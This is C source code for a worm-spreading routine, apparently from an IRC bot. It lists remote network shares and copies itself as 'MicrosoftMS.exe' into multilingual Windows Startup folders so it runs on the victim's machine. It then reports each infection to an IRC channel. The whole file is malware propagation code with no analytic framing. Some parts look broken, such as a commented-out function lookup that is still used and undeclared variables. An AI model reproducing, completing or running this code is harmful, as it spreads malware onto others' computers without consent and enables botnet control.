#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NETBIOS

 char *startupdirs[]={
	"Documents and Settings\\All Users\\Start Menu\\Programs\\Startup",
	"Dokumente und Einstellungen\\All Users\\Start Menu\\Programs\\Startup",
	"Documenti e Impostazioni\\All Users\\Start Menu\\Programs\\Startup",
	"WINDOWS\\Start Menu\\Programs\\Startup",
	"WINNT\\Profiles\\All Users\\Start Menu\\Programs\\Startup",
	"WINNT\\All Users\\Start Menu\\Programs\\Startup",
	"WINDOWS\\All Users\\Start Menu\\Programs\\StartUp",
	"Documents and Settings\\All Users\\Menu Start\\Programma's\\Opstarten",
	"Documents and Settings\\All Users\\Start-meny\\Program\\Autostart",
	"Documents and Settings\\All Users\\Start meny\\Program\\Autostart",
	"WIN\\Start Menu\\Programs\\Startup",
	"WINNT\\Start Menu\\Programs\\Startup",
	"Documents and Settings\\All Users\\Menu Demarrer\\Programmes\\Demarrage",
	NULL
 };


BOOL NetBios(char * Addr)
{

	char szRemoteAddr[MAX_PATH];
	sprintf(szRemoteAddr,"\\\\%s",Addr);
	HINSTANCE netapi32_dll = LoadLibrary("netapi32.dll");

       		
	if (netapi32_dll) {
		fNetShareEnum = (RSP5) GetProcAddress(netapi32_dll, "NetShareEnum");
		//fNetApiBufferFree = (NABF) GetProcAddress(netapi32_dll, "NetApiBufferFree");
		if (!fNetShareEnum || !fNetApiBufferFree) {
			//not xp/2000 ?
			return 2;
		}
	}
	else
		return 2; //dll's not found
	wchar_t wcRemoteAddr[MAX_PATH] = L"";
	mbstowcs(wcRemoteAddr, szRemoteAddr, strlen(szRemoteAddr) + 1);
   	PSHARE_INFO_1 BufPtr,p;
   	NET_API_STATUS res;
   	DWORD er=0,tr=0,resume=0, i;
	char thisfilename[MAX_PATH];
	char remotefilename[MAX_PATH];
	char remoteinifilename[MAX_PATH];
	char sendbuf[512];
	GetModuleFileName(NULL,thisfilename,sizeof(thisfilename));
   	do 
   	{
     		res = fNetShareEnum ((CHAR *) wcRemoteAddr, 1, (LPBYTE *) &BufPtr, -1, &er, &tr, &resume);
      		if(res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
        	{
         		p=BufPtr;
         		for(i=1;i<=er;i++)
         		{
				if (p->shi1_type == STYPE_DISKTREE) 
				{


					int s;
					for (s=0;startupdirs[s] != NULL;s++)
					{

						memset(remotefilename,0,sizeof(remotefilename));
						sprintf(remotefilename,"%s\\%s\\%s\\MicrosoftMS.exe",szRemoteAddr,p->shi1_netname,startupdirs[s]);
						if (CopyFile(thisfilename,remotefilename,TRUE) != 0) {

							_snprintf(buffer,sizeof(buffer),"[NetBios]: Exploiting IP: %s",remotefile);
							irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);

							fNetApiBufferFree(BufPtr);
							FreeLibrary(netapi32_dll);
         						return 1;
						}
					}

				}
            			p++;
         		}
         		fNetApiBufferFree(BufPtr);
        	}
		else 	{
			FreeLibrary(netapi32_dll);
         		return 1;
		}
	}
   	while (res==ERROR_MORE_DATA); 
	FreeLibrary(netapi32_dll);
	return 1;
}
#endif
